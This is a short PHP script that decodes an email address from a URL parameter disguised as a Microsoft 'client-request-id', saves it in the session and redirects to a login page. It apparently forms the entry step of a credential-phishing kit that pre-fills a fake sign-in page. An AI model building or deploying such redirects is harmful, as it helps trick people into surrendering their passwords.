<?php
session_start();

// Get Email
$mail = base64_decode($_GET['client-request-id']);
$_SESSION['mail'] = $mail;

// Get Domain
$b = explode('@', $mail);
$domain = $b[1];

$a = explode('.', $mail);
$domain_2 = $a[1];

header("Location: /auth/login.php");


?>